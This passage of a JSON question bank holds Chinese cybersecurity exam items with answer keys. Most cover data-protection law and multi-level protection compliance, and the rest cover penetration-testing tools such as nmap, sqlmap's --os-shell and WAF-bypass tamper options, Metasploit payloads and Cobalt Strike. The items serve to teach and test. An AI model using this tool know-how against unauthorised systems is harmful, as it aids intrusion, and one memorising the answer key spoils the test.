）。","o":["可以自由传输到境外","境内存储，确需向境外提供的应进行安全评估","必须全部销毁","无需存储"],"a":1,"e":"\u003cb>关基运营者的个人信息和重要数据应当在境内存储\u003c/b>（网安法第37条），确需向境外提供的应当进行安全评估。这是数据主权的重要体现。非关基运营者出境个人信息也需满足个保法的条件。"},{"c":"law","t":"s","q":"ISO 27001认证周期和审核类型包括（　）。","o":["只有初次认证","初次审核+年度监督审核+三年周期满再认证审核","只有年度监督审核","只需要文件审查"],"a":1,"e":"\u003cb>ISO 27001认证周期三年\u003c/b>：初次审核（文件审查+现场）+每年监督审核（至少一年一次）+三年到期再认证审核。证书有效期三年，到期需再认证。企业应持续维护体系，不可突击应付审核。"},{"c":"law","t":"s","q":"《关键信息基础设施安全保护条例》自（　）施行。","o":["2021年9月1日","2021年11月1日","2022年1月1日","2020年6月1日"],"a":0,"e":"《关键信息基础设施安全保护条例》\u003cb>2021年9月1日施行\u003c/b>（与《数据安全法》同日），明确了关基运营者、保护工作部门与监管体系的要求。"},{"c":"law","t":"s","q":"个人信息和重要数据向境外提供前，必须（　）。","o":["依法开展安全评估并完成相关程序","直接传输","口头申请","无需任何程序"],"a":0,"e":"向境外提供重要数据/个人信息，须按《数据安全法》《个人信息保护法》\u003cb>履行安全评估（出境评估、认证或标准合同）\u003c/b>；未经评估擅自出境将承担法律责任。"},{"c":"law","t":"s","q":"《数据安全法》确立的数据安全制度基础是（　）。","o":["数据分类分级保护制度","免费开放所有数据","数据无限期保存","取消数据跨境"],"a":0,"e":"\u003cb>数据分类分级保护制度\u003c/b>要求按数据的重要程度实施差异化管理（核心数据、重要数据、一般数据），是数据安全工作的前提与抓手。"},{"c":"law","t":"s","q":"处理个人信息应当遵循的原则不包括（　）。","o":["最小必要原则","公开透明原则","可无限收集原则","取得同意原则"],"a":0,"e":"处理个人信息须遵循\u003cb>合法、正当、必要（最小必要）、公开透明、取得同意\u003c/b>等原则；“可无限收集”明显违反“最小必要”，属于违法收集。"},{"c":"law","t":"s","q":"根据等保要求，第三级（含）以上系统的等级测评周期为（　）。","o":["每年至少一次","每两年一次","每五年一次","不要求"],"a":0,"e":"\u003cb>等保三级及以上系统每年至少测评一次\u003c/b>，二级一般建议两年一次；测评由具备资质的测评机构出具报告，发现的问题须限期整改。"},{"c":"law","t":"s","q":"现行等保2.0核心标准《网络安全等级保护基本要求》是（　）。","o":["GB/T 22239-2019","GB/T 22239-2008","ISO/IEC 27001","NIST SP 800-53"],"a":0,"e":"\u003cb>等保2.0基本要求为GB/T 22239-2019\u003c/b>，替代2008版，新增云平台、物联网、工控系统、大数据等扩展要求；ISO/IEC 27001是信息安全管理体系国际标准。"},{"c":"law","t":"s","q":"《网络安全审查办法》主要审查的是（　）。","o":["关键信息基础设施运营者采购网络产品和服务的安全风险与供应链安全","员工工资","网页美观度","带宽资费"],"a":0,"e":"\u003cb>网络安全审查针对关基运营者采购的网络产品和服务\u003c/b>，评估其被非法控制、中断、数据泄露等风险，重点关注供应链安全与国家数据安全。"},{"c":"law","t":"s","q":"发现安全漏洞后，按照相关规定应当（　）。","o":["及时修复并向国家网络安全漏洞信息平台报告","只在内部传播","故意隐瞒","私下倒卖漏洞"],"a":0,"e":"按《网络安全法》与漏洞管理规定，发现本网络漏洞应\u003cb>及时修复并向主管部门/漏洞平台报告\u003c/b>；安全研究者应通过白帽渠道提交，倒卖漏洞属违法行为。"},{"c":"law","t":"s","q":"运维人员接触敏感系统与数据，应（　）。","o":["签订保密协议，并遵循最小权限与操作审计","口头承诺即可","随意共享账号","无任何约束"],"a":0,"e":"涉敏岗位应\u003cb>签订保密协议\u003c/b>，配合权限最小化、操作审计与离职账号回收，防范内部数据泄露与越权操作，这是数据安全治理的基础要求。"},{"c":"law","t":"s","q":"关于电子数据作为证据，下列说法正确的是（　）。","o":["提取过程应合法合规、可追溯，保证原始性与完整性（哈希校验）","可以随意篡改","无需记录操作过程","只认纸质材料"],"a":0,"e":"电子数据取证须\u003cb>合法、规范、可追溯\u003c/b>：采用只读方式获取、计算哈希锁定完整性、全程记录操作过程，否则证据可能因污染而被排除。"},{"c":"law","t":"s","q":"网络运营者不履行网络安全保护义务且拒不改正的，可能面临（　）。","o":["责令改正、警告、罚款，情节严重可暂停业务、关闭网站","只有口头警告","无任何后果","只能刑事处罚"],"a":0,"e":"《网络安全法》规定不履行保护义务的，由主管部门\u003cb>责令改正、警告、罚款\u003c/b>，拒不改正或情节严重的，可责令暂停相关业务、停业整顿、关闭网站、吊销证照。"},{"c":"law","t":"s","q":"等保第五级对应的名称是（　）。","o":["专控保护级","强制保护级","监督保护级","指导保护级"],"a":0,"e":"\u003cb>第五级=专控保护级\u003c/b>，针对国家安全特别严重受损的场合，由国家专门部门实施专控监管；第四级为强制保护级。"},{"c":"law","t":"s","q":"等保2.0强调的“可信验证”是指（　）。","o":["对系统启动、关键程序加载等环节进行完整性/可信度量，发现篡改即采取措施","对用户口令做哈希","验证浏览器版本","校验IP归属"],"a":0,"e":"\u003cb>可信验证对系统启动与关键执行环节进行可信度量\u003c/b>，防止系统/程序被篡改或非授权运行，是等保2.0相对1.0的重要新增要求，常结合可信计算技术实现。"},{"c":"law","t":"s","q":"使用商用密码保护的系统，等保合规中还需进行（　）。","o":["商用密码应用安全性评估（密评）","外观检测","性能压测","UI测试"],"a":0,"e":"使用商用密码的系统须开展\u003cb>商用密码应用安全性评估（密评）\u003c/b>，验证密码应用的合规性、正确性与有效性；关键信息基础设施系统密评是强制要求，并与等保测评衔接。"},{"c":"law","t":"s","q":"《刑法》第285条非法侵入计算机信息系统罪，其规制对象是（　）。","o":["非法侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统","非法侵入任何个人电脑","网络购物纠纷","手机欠费"],"a":0,"e":"\u003cb>刑法285条：非法侵入\u003cb>国家事务、国防建设、尖端科学技术领域\u003c/b>的计算机信息系统构成犯罪\u003c/b>；第二款非法获取计算机信息系统数据、第三款提供侵入/破坏工具（针对任何系统）均属此条。\u003cb>易错点\u003c/b>：'侵入特定领域系统'是285条第一款核心；普通系统非法入侵多按285条第2款/第3款或286条处理。\u003cb>记忆\u003c/b>：'285=非法侵入/获取/提供工具'。"},{"c":"law","t":"s","q":"《刑法》第286条破坏计算机信息系统罪的典型行为是（　）。","o":["对计算机信息系统功能/数据进行删除、修改、增加、干扰，或故意制作传播病毒等破坏性程序","口令设置过弱","正常系统升级","忘记密码"],"a":0,"e":"\u003cb>刑法286条：\u003cb>违反国家规定，对计算机信息系统功能进行删除、修改、增加、干扰，造成不能正常运行；或对数据/应用程序进行删除、修改、增加；或故意制作传播计算机病毒等破坏性程序，后果严重\u003c/b>构成破坏计算机信息系统罪\u003c/b>。\u003cb>易错点\u003c/b>：'286=破坏（删改增、干扰、病毒）'。\u003cb>记忆\u003c/b>：'285入侵，286破坏'。"},{"c":"law","t":"s","q":"未经授权对他人系统开展渗透测试（超出授权范围）可能触犯的法律是（　）。","o":["《刑法》第285/286条（非法侵入/破坏计算机信息系统罪）","《劳动合同法》","《广告法》","《交通法》"],"a":0,"e":"\u003cb>超出授权的'渗透测试'=非法侵入/破坏，可触犯\u003cb>刑法285/286条\u003c/b>及《网络安全法》第63条（治安处罚），严重者构成犯罪\u003c/b>。\u003cb>红线\u003c/b>：渗透测试必须\u003cb>书面授权\u003c/b>明确范围/时间/方法，否则合法测试变违法。\u003cb>易错点\u003c/b>：'授权书是安全测试的护身符'。\u003cb>记忆\u003c/b>：'没授权就是犯罪，授权才是测试'。"},{"c":"law","t":"s","q":"《网络安全法》要求网络运营者留存网络日志的期限是（　）。","o":["不少于6个月","不少于3天","不少于1年","没有要求"],"a":0,"e":"\u003cb>《网络安全法》第21条要求网络运营者\u003cb>留存网络日志不少于6个月\u003c/b>\u003c/b>（等保2.0同样要求审计记录留存≥6个月）。\u003cb>易错点\u003c/b>：'6个月'是常考数字；日志包括登录、操作、安全事件等。\u003cb>记忆\u003c/b>：'日志留半年'。"},{"c":"law","t":"s","q":"《网络安全法》确立的网络安全等级保护制度，其监督主体是（　）。","o":["公安机关","市场监督管理局","工信部下属企业","银行业协会"],"a":0,"e":"\u003cb>等保制度依法确立并由\u003cb>公安机关\u003c/b>负责监督指导（备案、监督检查）；\u003cb>测评机构\u003c/b>开展符合性测评\u003c/b>。\u003cb>易错点\u003c/b>：'定级单位自定级，备案到公安机关，测评由机构做，监督是公安机关'。\u003cb>记忆\u003c/b>：'备案找公安，测评找机构'。"},{"c":"law","t":"s","q":"根据《数据安全法》，数据分类分级保护制度的核心是（　）。","o":["根据数据在经济社会发展中的重要程度及危害程度进行分类分级保护","所有数据同等对待","只保护个人数据","按文件大小分类"],"a":0,"e":"\u003cb>《数据安全法》第21条确立\u003cb>数据分类分级保护\u003c/b>：按数据对国家安全/公共利益/个人合法权益的重要程度分级（一般数据、重要数据、核心数据），不同等级不同保护强度\u003c/b>。\u003cb>易错点\u003c/b>：'分类分级是数据安全治理的起点'。\u003cb>记忆\u003c/b>：'先分级再保护，重要数据重点管'。"},{"c":"law","t":"s","q":"《个人信息保护法》中，处理个人信息需遵循的'最小必要'原则是指（　）。","o":["只收集与处理目的直接相关且最少的个人信息，不得过度收集","尽量多收集备用","必须收集所有信息","与目的无关也可以收集"],"a":0,"e":"\u003cb>个保法'最小必要'：\u003cb>收集范围最小化、与处理目的直接相关、保存期限最短\u003c/b>；同时需\u003ccode>告知-同意\u003c/code>、目的限定、提供删除/更正权等\u003c/b>。\u003cb>易错点\u003c/b>：'不过度收集、不用则删'。\u003cb>记忆\u003c/b>：'够用就好、告知同意、用毕即删'。"},{"c":"law","t":"s","q":"《个人信息保护法》对个人信息跨境提供的核心要求是（　）。","o":["通过安全评估/标准合同/认证等方式并取得单独同意，保障境外处理者达标","可以随意跨境","跨境无需告知","只要脱敏即可任意出境"],"a":0,"e":"\u003cb>个保法规定个人信息出境需具备下列之一：\u003cb>通过国家网信部门安全评估（关键/大量场景）、签订标准合同、通过保护认证\u003c/b>，且处理者需\u003cb>单独同意\u003c/b>与告知境外接收方信息\u003c/b>。\u003cb>易错点\u003c/b>：'脱敏/匿名化后可自由传输，但一般脱敏≠匿名化'。\u003cb>记忆\u003c/b>：'出境三通道：安全评估、标准合同、认证'。"},{"c":"law","t":"s","q":"《密码法》中，商用密码实行（　）管理。","o":["依法管理、自由使用","完全禁止","政府垄断","仅限军队"],"a":0,"e":"\u003cb>《密码法》分类：\u003cb>核心密码、普通密码\u003c/b>（保护国家秘密，严格管理）；\u003cb>商用密码\u003c/b>（保护非国家秘密信息，\u003cb>依法管理、自由使用\u003c/b>，用于企业加密、HTTPS、身份认证等）\u003c/b>。\u003cb>易错点\u003c/b>：'商用密码不涉密、可自由用但要合规（密评）'。\u003cb>记忆\u003c/b>：'商密自由用，核心普通严格管'。"},{"c":"law","t":"s","q":"《关键信息基础设施安全保护条例》中，关键信息基础设施（CII）的认定范围主要涉及（　）。","o":["公共通信、能源、交通、水利、金融、电子政务等重要行业和领域的重要网络设施、信息系统","所有个人网站","普通网吧","测试服务器"],"a":0,"e":"\u003cb>CII指\u003cb>公共通信和信息服务、能源、交通、水利、金融、公共服务、电子政务、国防科工等\u003c/b>重要行业和领域的\u003cb>重要网络设施、信息系统\u003c/b>，一旦遭到破坏/丧失功能会严重危害国家安全、国计民生、公共利益\u003c/b>。\u003cb>易错点\u003c/b>：'重要行业+重要系统=关基'。\u003cb>记忆\u003c/b>：'关系到国计民生的核心系统=关基'。"},{"c":"law","t":"s","q":"关基运营者（CIIO）的主要保护义务包括（　）。","o":["设置专门安全管理机构与负责人、开展风险评估、留存日志并每年至少一次检测评估、数据境内存储","可以不做备份","无需负责人","日志不保留"],"a":0,"e":"\u003cb>关基条例要求：\u003cb>设立专门安全管理机构与负责人、安全保护措施与等保三级以上同步规划建设、每年至少进行一次检测评估、重要数据境内存储（出境需安全评估）、定期风险评估、报告重大事件\u003c/b>\u003c/b>。\u003cb>易错点\u003c/b>：'关基=更严的等保+专门机构+年检+数据境内'。\u003cb>记忆\u003c/b>：'关基四件套：专门机构、年检、境内存储、风险评估'。"},{"c":"law","t":"s","q":"《数据安全法》中，向境外提供'重要数据'的合规前提是（　）。","o":["通过国家网信部门组织的安全评估（法律另有规定的除外）","直接传输","只需内部审批","无需任何手续"],"a":0,"e":"\u003cb>《数据安全法》第31条：\u003cb>关键信息基础设施运营者在境内运营中收集和产生的重要数据出境，应通过国家网信部门组织的安全评估\u003c/b>；其他处理者重要数据出境按规定（如出境评估办法）执行\u003c/b>。\u003cb>易错点\u003c/b>：'重要数据出境=安全评估是硬门槛'。\u003cb>记忆\u003c/b>：'重要数据出国门，先过安全评估关'。"},{"c":"law","t":"s","q":"《网络安全法》对网络运营者'安全事件报告'的要求是（　）。","o":["发生网络安全事件立即启动应急预案，及时向有关主管部门报告","自行处理不报告","延迟一周报告","只在年报里提及"],"a":0,"e":"\u003cb>《网络安全法》第25条要求运营者制定应急预案及时处置；\u003cb>发生危害网络安全事件时立即启动预案、采取补救措施、按规定向主管部门报告\u003c/b>\u003c/b>；重要数据泄露还有专门的报告时限要求（如部分行业24小时内）。\u003cb>易错点\u003c/b>：'事件必报、及时报'。\u003cb>记忆\u003c/b>：'出事即预案、补救并上报'。"},{"c":"law","t":"s","q":"等级保护定级时，确定保护等级的两大要素是（　）。","o":["受侵害的客体（对象）与对客体造成侵害的程度","系统数量","设备品牌","员工人数"],"a":0,"e":"\u003cb>等保定级依据\u003cb>①受侵害的客体\u003c/b>（公民法人合法权益/社会秩序公共利益/国家安全）与\u003cb>②侵害程度\u003c/b>（一般/严重/特别严重）两个要素确定等级\u003c/b>。\u003cb>易错点\u003c/b>：'定级看'受害对象+受害程度'，不是看系统大小'。\u003cb>记忆\u003c/b>：'客体+程度=定级'。"},{"c":"law","t":"s","q":"等保2.0中，第三级（监督保护级）系统的测评频率要求是（　）。","o":["每年至少一次","每三年一次","不需要测评","只看备案"],"a":0,"e":"\u003cb>等保2.0三级系统\u003cb>每年至少测评一次\u003c/b>；二级一般两年一次（或按地区/主管要求）\u003c/b>。\u003cb>易错点\u003c/b>：'三级=年检'是高频考点。\u003cb>记忆\u003c/b>：'三级年年测，二级可两年'。"},{"c":"law","t":"s","q":"等保2.0对三级系统身份鉴别的进一步要求包括（　）。","o":["两种及以上组合鉴别技术、鉴别失败处理（锁定/延迟）、远程管理通道加密","只设口令","允许空口令","不限制登录失败"],"a":0,"e":"\u003cb>等保三级身份鉴别：\u003cb>两种及以上组合技术（MFA）、登录失败处理（锁定/延迟/告警）、鉴别信息复杂度与更换周期、远程管理通道（如SSH/TLS）加密\u003c/b>\u003c/b>。\u003cb>易错点\u003c/b>：'三级=双因素+失败处理+远程加密'。\u003cb>记忆\u003c/b>：'三重保险：双因素、防爆破、加密通道'。"},{"c":"law","t":"s","q":"等保2.0中，'安全审计'控制类的基本要求是（　）。","o":["审计记录包含用户身份/行为/时间，留存≥6个月，审计进程安全","无需审计","审计记录当天删除","审计不保护"],"a":0,"e":"\u003cb>等保审计要求：\u003cb>记录用户身份、操作行为与时间，审计记录保护（防篡改/防删除），留存≥6个月\u003c/b>；并覆盖登录、访问、管理操作等\u003c/b>。\u003cb>易错点\u003c/b>：'审计要覆盖关键行为+留足6个月'。\u003cb>记忆\u003c/b>：'审计=记录谁在何时干了什么，锁好留半年'。"},{"c":"law","t":"s","q":"《商用密码管理条例》（2023年修订）对商用密码应用的基本要求是（　）。","o":["依法使用、合规应用，关键信息基础设施须使用商用密码并开展密评","完全不用密码","任意使用不评估","仅建议性要求"],"a":0,"e":"\u003cb>《商用密码管理条例》明确：\u003cb>依法使用商用密码；关基运营者应使用商用密码进行保护，并自行或委托开展商用密码应用安全性评估（密评）\u003c/b>；密评结果作为系统安全保护措施有效性评估的重要依据\u003c/b>。\u003cb>易错点\u003c/b>：'密评是关基强制项'。\u003cb>记忆\u003c/b>：'关基必用商密、必做密评'。"},{"c":"law","t":"s","q":"网络安全等级保护中，'定级'阶段的输出成果是（　）。","o":["定级报告（含定级对象描述、受侵害客体与程度分析、初步定级）","整改方案","测评报告","备案证明"],"a":0,"e":"\u003cb>定级阶段产出\u003cb>定级报告\u003c/b>（描述定级对象、分析受侵害客体与侵害程度、给出保护等级），随后\u003cb>备案\u003c/b>（向公安机关提交备案材料取得\u003cb>备案证明\u003c/b>）\u003c/b>。\u003cb>易错点\u003c/b>：'定级出报告、备案出证明、测评出报告'。\u003cb>记忆\u003c/b>：'定级报告→备案证明→测评报告'。"},{"c":"law","t":"s","q":"安全管理制度体系通常包含的层级是（　）。","o":["安全方针/总体策略→管理制度→操作规程/细则","只有一条口令","只有应急预案","只有保密协议"],"a":0,"e":"\u003cb>制度体系自上而下：\u003cb>安全方针（方向）→安全管理制度（具体规定）→操作规程/细则（落地执行）\u003c/b>，配套记录表格与考核\u003c/b>。\u003cb>易错点\u003c/b>：'有制度无执行等于没有'。\u003cb>记忆\u003c/b>：'方针定方向、制度定规矩、规程定动作'。"},{"c":"law","t":"s","q":"网络安全应急管理中，'应急预案'的核心要素不包括（　）。","o":["应急预案中标注每个员工的私人社交账号","应急组织与职责、事件分级、处置流程、通讯联络、演练计划","事件分类分级","恢复与总结机制"],"a":0,"e":"\u003cb>应急预案要素：\u003cb>应急组织与职责、事件分级、处置流程（检测-遏制-根除-恢复）、通讯联络、资源保障、演练计划、总结改进\u003c/b>\u003c/b>；'私人社交账号'不是预案要素。\u003cb>易错点\u003c/b>：'预案要能照着演，演练要定期做'。\u003cb>记忆\u003c/b>：'组织、分级、流程、联络、演练，五要素'。"},{"c":"law","t":"s","q":"等保2.0安全区域边界中，'访问控制'要求的主要体现是（　）。","o":["根据会话状态信息为数据流提供明确的允许/拒绝访问控制，且策略颗粒度到端口级","放开所有端口","只允许外网访问","不做控制"],"a":0,"e":"\u003cb>等保区域边界访问控制：\u003cb>根据安全策略和会话状态信息控制进出网络数据流，访问控制规则基于源/目的地址、端口、协议等，颗粒度到端口级\u003c/b>，并限制远程管理源地址\u003c/b>。\u003cb>易错点\u003c/b>：'边界=按策略过滤进出+粒度到端口'。\u003cb>记忆\u003c/b>：'边界管进管出、按会话按端口'。"},{"c":"law","t":"s","q":"等保2.0安全通信网络中的'通信传输'要求通常是（　）。","o":["通信过程采用密码技术保证完整性/保密性（如TLS/IPsec/VPN）","明文传输即可","只加密口令","不传输数据"],"a":0,"e":"\u003cb>等保通信传输要求：\u003cb>采用密码技术保证通信过程中的数据完整性/保密性\u003c/b>（如HTTPS、SSH、IPsec VPN），网络架构合理（划分安全域）\u003c/b>。\u003cb>易错点\u003c/b>：'关键传输要加密+验完整性'。\u003cb>记忆\u003c/b>：'线路上也要上锁（加密+完整性）'。"},{"c":"law","t":"s","q":"《网络安全法》第63条对'从事非法侵入他人网络'个人的处罚形式是（　）。","o":["警告/罚款/拘留等治安处罚（构成犯罪的追究刑事责任）","只批评教育","无任何处罚","奖励"],"a":0,"e":"\u003cb>网安法63条：\u003cb>非法侵入、干扰、破坏他人网络，窃取数据等，予以警告、罚款（个人最高数十万）、拘留等处罚；构成犯罪追究刑事责任\u003c/b>\u003c/b>。\u003cb>易错点\u003c/b>：'行政处罚+刑事责任双轨'。\u003cb>记忆\u003c/b>：'网安法63条=治安+刑责双管'。"},{"c":"law","t":"s","q":"网络安全'三同步'原则是指（　）。","o":["安全技术措施与主体工程同步规划、同步建设、同步使用","同时买三套设备","三个部门同步","三倍预算"],"a":0,"e":"\u003cb>'三同步'：\u003cb>网络安全保护措施与信息化项目/主体工程同步规划、同步建设、同步使用\u003c/b>（《网络安全法》与等保要求），避免'先建设后补安全'\u003c/b>。\u003cb>易错点\u003c/b>：'新建系统从设计就要带安全'。\u003cb>记忆\u003c/b>：'规划、建设、使用，安全全程同步'。"},{"c":"law","t":"s","q":"根据等保2.0，二级系统安全计算环境'身份鉴别'的基本要求是（　）。","o":["对口令设置复杂度要求，对登录失败进行处置（锁定/延迟）等","必须是双因素","无需鉴别","只验IP"],"a":0,"e":"\u003cb>二级身份鉴别要求：\u003cb>用户身份标识与鉴别、口令复杂度要求、登录失败处理（如锁定/延迟）、远程管理通道加密\u003c/b>；三级则在二级基础上增加\u003cb>两种及以上组合鉴别\u003c/b>\u003c/b>。\u003cb>易错点\u003c/b>：'双因素是三级门槛，二级是基础口令+失败处理'。\u003cb>记忆\u003c/b>：'二级基础，三级加双因素'。"},{"c":"law","t":"s","q":"个人信息处理中，'告知-同意'原则的含义是（　）。","o":["处理前向个人告知处理目的/方式/范围并取得同意，重大事项需单独同意","处理无需告知","默认同意","事后告知即可"],"a":0,"e":"\u003cb>个保法'告知-同意'：\u003cb>处理前以显著方式、清晰易懂地告知目的、方式、范围等，并取得个人自愿明确同意；敏感个人信息、向他人提供、公开、跨境等需单独同意\u003c/b>；个人信息可撤回同意\u003c/b>。\u003cb>易错点\u003c/b>：'敏感信息+跨境要单独同意'。\u003cb>记忆\u003c/b>：'先告知、后同意、敏感单独问'。"},{"c":"law","t":"s","q":"数据脱敏（去标识化/匿名化）在数据处理中的主要作用是（　）。","o":["降低数据泄露后的风险与合规负担（匿名化后的数据不再属个人信息）","让数据变大","删除所有数据","加密存储介质"],"a":0,"e":"\u003cb>去标识化/匿名化：\u003cb>去除或加密可识别个人的信息；匿名化后无法识别特定个人、不可复原，不再受个人信息保护法约束\u003c/b>，可在开发/测试/分析中安全使用\u003c/b>。\u003cb>易错点\u003c/b>：'匿名化≠去标识化（去标识化仍需保护）'。\u003cb>记忆\u003c/b>：'匿名化=彻底除名，去标识=打码仍可追'。"},{"c":"law","t":"s","q":"网络安全等级保护中，运营者自行测评与第三方测评的区别是（　）。","o":["等级测评须由具备资质的测评机构开展，并出具测评报告，运营者自行测评不能替代","无区别","自行测评更权威","第三方不合法"],"a":0,"e":"\u003cb>等保\u003cb>等级测评必须由依法设立、具备资质的测评机构\u003c/b>对系统进行符合性测评并出具测评报告（作为整改与监督依据）；运营者自评只能作为内部检查\u003c/b>。\u003cb>易错点\u003c/b>：'测评机构出报告才有效'。\u003cb>记忆\u003c/b>：'测评要机构、出报告、才作数'。"},{"c":"law","t":"s","q":"《反电信网络诈骗法》的立法核心是（　）。","o":["预防、遏制和惩治电信网络诈骗活动，强化实名制与涉诈资金处置等","只处罚受害者","鼓励诈骗","仅约束个人"],"a":0,"e":"\u003cb>《反电信网络诈骗法》（2022年施行）构建\u003cb>预防、打击、治理一体化\u003c/b>机制：加强实名制（电话卡/银行卡/网络账号）、涉诈资金快速止付冻结、行业治理与责任追究\u003c/b>。\u003cb>易错点\u003c/b>：'实名制+资金拦截+行业协同'是核心。\u003cb>记忆\u003c/b>：'反诈法=实名堵源、止付止损、全链条治理'。"},{"c":"pentest","t":"s","q":"开展渗透测试最基本的前提条件是（　）。","o":["获得目标方的书面授权","准备最新版本的工具","目标系统先下线","向所有人公告测试时间"],"a":0,"e":"\u003cb>授权书是红线\u003c/b>：明确测试范围（IP/域名/系统）、时间窗口、禁止项（如社工、DoS）、联系人与应急处置流程。超出授权范围的任何测试都可能触犯刑法第285/286条。“未授权=违法”，与技术水平无关。"},{"c":"pentest","t":"s","q":"只获知目标域名和地址、不给任何内部信息的测试方式是（　）。","o":["白盒测试","黑盒测试","灰盒测试","单元测试"],"a":1,"e":"\u003cb>黑盒模拟外部攻击者视角\u003c/b>；白盒提供源码/架构，覆盖更深；灰盒给予部分信息（如普通账号），模拟已立足内网的攻击者。对应的工具体系：SAST白盒代码审计、DAST黑盒扫描、IAST运行时插桩检测。"},{"c":"pentest","t":"s","q":"查询域名注册人、注册商、DNS服务器及到期时间的服务/命令是（　）。","o":["whois","nslookup only","traceroute","netstat"],"a":0,"e":"\u003cb>whois是信息收集第一步\u003c/b>：注册人/组织、邮箱、注册商、NS服务器、创建与到期时间；域名历史解析记录同样有价值。防御侧可在注册商开启隐私保护，并防范注册邮箱被接管导致域名被转移。"},{"c":"pentest","t":"s","q":"通过证书透明度（CT）日志（如crt.sh）主要可以收集（　）。","o":["目标子域名","员工手机号","服务器内存","防火墙规则"],"a":0,"e":"\u003cb>为各子域名签发证书会留下公开的CT日志记录\u003c/b>，由此可枚举大量隐藏子域名；配合字典爆破、搜索引擎语法、第三方聚合工具（如OneForAll）效果更佳。子域名遗留与解析记录失效还可能造成子域接管风险。"},{"c":"pentest","t":"s","q":"FOFA、Shodan、ZoomEye这类平台被称为（　）。","o":["漏洞扫描器","网络空间测绘搜索引擎","日志分析平台","密码管理工具"],"a":1,"e":"\u003cb>空间测绘引擎按IP/端口/Banner/证书检索全网暴露资产\u003c/b>，是暴露面自查与红队信息收集利器（企业应定期自查“影子资产”并下线）。注意：查询本身合法，但对检索到的系统进行测试仍需授权。"},{"c":"pentest","t":"s","q":"nmap中默认（需root权限）且不完成完整三次握手的隐蔽扫描方式是（　）。","o":["-sT（全连接扫描）","-sS（SYN半开扫描）","-sU（UDP扫描）","-sV（版本探测）"],"a":1,"e":"\u003cb>-sS半开扫描：发SYN后收到SYN+ACK即回RST断开\u003c/b>，不建立完整连接，速度较快且日志痕迹少；-sT为全连接扫描（通用但易被记录）；-sU UDP扫描慢且依赖响应推断；-sV探测服务版本。生产网络扫描会触发告警，务必在授权窗口内进行。"},{"c":"pentest","t":"s","q":"nmap中用于识别目标操作系统类型的参数是（　）。","o":["-O","-P","-A","-V"],"a":0,"e":"\u003cb>-O基于TCP/IP协议栈指纹（TTL、窗口大小等）推测操作系统\u003c/b>；-sV探测服务版本；\u003cb>-A为“激进”组合探测（版本+系统+脚本+路由跟踪），流量大、动静大\u003c/b>；还可配合NSE脚本（--script vuln等）批量检查已知漏洞。"},{"c":"pentest","t":"s","q":"nmap扫描全端口（65535个）的正确参数是（　）。","o":["-p 1-100","-p-","--all","-full"],"a":1,"e":"\u003cb>-p-表示扫描全部65535个端口\u003c/b>，耗时较长但避免遗漏高危非常规端口服务；默认只扫Top1000端口。常用组合：nmap -p- -sV 目标 先摸清全端口再细查；-oN/-oX输出文本/XML结果便于写报告。"},{"c":"pentest","t":"s","q":"dirsearch、gobuster、ffuf这类工具的用途是（　）。","o":["目录与文件爆破","端口扫描","流量抓取","提权"],"a":0,"e":"\u003cb>基于字典探测Web路径\u003c/b>：后台（/admin）、备份文件（.zip/.sql/.bak）、代码仓库泄露（.git/.svn）、接口文档（swagger）等。备份与源码泄露是最常见的突破口之一；防御：删除备份、关闭目录列表、后台加访问控制。"},{"c":"pentest","t":"s","q":"whatweb、Wappalyzer这类工具的作用是（　）。","o":["指纹识别（识别CMS/中间件/框架及版本）","发送钓鱼邮件","破解Wi-Fi","抓包"],"a":0,"e":"\u003cb>通过响应头、Cookie、特征文件等识别目标技术栈与版本\u003c/b>，再对照已知漏洞库（如某版本Struts2、Log4j2、Shiro、Fastjson的已知CVE）制定利用路径。测绘平台同样内置指纹库，可离线复盘暴露面。"},{"c":"pentest","t":"s","q":"sqlmap中提高检测覆盖面（注入点与payload数量）的参数组合是（　）。","o":["--fast --quick","--level --risk","--speed --deep","--wide"],"a":1,"e":"\u003cb>--level（探测点范围：Cookie/XFF等随级别纳入）与--risk（payload激进程度）共同决定覆盖面\u003c/b>，默认1/1；3/3以上更全但更慢且风险更高。--batch自动选择默认答案；--tamper加载绕WAF脚本（如space2comment、randomcase）。"},{"c":"pentest","t":"s","q":"sqlmap尝试获取操作系统shell（写文件落地）的参数是（　）。","o":["--os-shell","--root","--admin","--system"],"a":0,"e":"\u003cb>--os-shell在注入点权限高、目录可写、数据库允许文件导出（如MySQL secure_file_priv）时尝试写文件获得命令执行\u003c/b>。同理--file-read/--file-write读写文件。仅可用于授权测试环境。"},{"c":"pentest","t":"s","q":"Burp Suite中手工构造请求反复调试验证漏洞的模块是（　）。","o":["Proxy","Repeater","Decoder","Comparer"],"a":1,"e":"\u003cb>Repeater重放改包：验证越权、注入、逻辑漏洞的日常主力\u003c/b>；Proxy拦截；Intruder爆破；Decoder多格式编解码；Comparer比对差异。抓HTTPS流量需在浏览器导入Burp的CA证书。"},{"c":"pentest","t":"s","q":"Metasploit框架中，exploit与payload的概念分别是（　）。","o":["漏洞利用模块与攻击载荷","扫描器与字典","防火墙与绕过","报告与截图"],"a":0,"e":"\u003cb>exploit负责触发漏洞，payload是漏洞成功后执行的载荷\u003c/b>（bind正向监听/reverse反向回连，reverse更易穿透防火墙）。msfconsole为交互入口；msfvenom生成各平台载荷；post模块用于后渗透信息收集。仅用于授权测试与靶场。"},{"c":"pentest","t":"s","q":"Cobalt Strike这类工具的定位是（　）。","o":["办公软件","C2（命令与控制）框架，红队与APT常用","代码编辑器","数据库客户端"],"a":1,"e":"\u003cb>C2框架：Beacon支持HTTP(S)/DNS等通信、心跳间隔控制、横向移动与权限维持集成\u003c/b>。防守方应对：识别其流量特征（JA3指纹、心跳规律）、出口流量管控、威胁情报联动。红队工具被勒索团伙滥用已成常态。"},{"c":"pentest","t":"s","q":"普通Webshell权限提升到system/root权限的过程称为（　）。","o":["水平提权","垂直提权","降权","横向移动"],"a":1,"e":"\u003cb>垂直提权=从低权限跃升到高权限\u003c/b>（水平提权是同级间越权访问）。常见路径：内核漏洞溢出（脏牛等）、错误配置（可写服务路径、sudo NOPASSWD、异常SUID程序）、令牌窃取。运维自查：及时补内核补丁、最小化SUID、sudo白名单。"},{"c":"pentest","t":"s","q":"与“权限维持”排查不对应的检查项是（　）。","o":["crontab -l 